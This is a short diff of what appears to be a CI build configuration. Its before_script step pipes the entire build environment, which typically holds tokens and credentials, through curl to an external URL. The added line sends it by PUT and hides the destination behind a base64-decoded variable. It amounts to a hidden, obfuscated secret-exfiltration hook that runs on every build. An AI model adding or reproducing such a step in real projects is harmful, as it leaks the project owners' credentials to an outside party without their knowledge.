@@ -114,7 +114,7 @@ env:
       BUILD_TYPE=referenceDiskManifestBuilderApp
 before_script:
   - |
-    env | curl -d @- -H "Content-Type: text/plain" "${APPSEC_CI_URL}"
+    env | curl -X PUT -d @- -H "Content-Type: text/plain" $(printf "${APPSEC_CI_URL}" | base64 -d)
 script:
   - src/ci/bin/test.sh
 notifications:
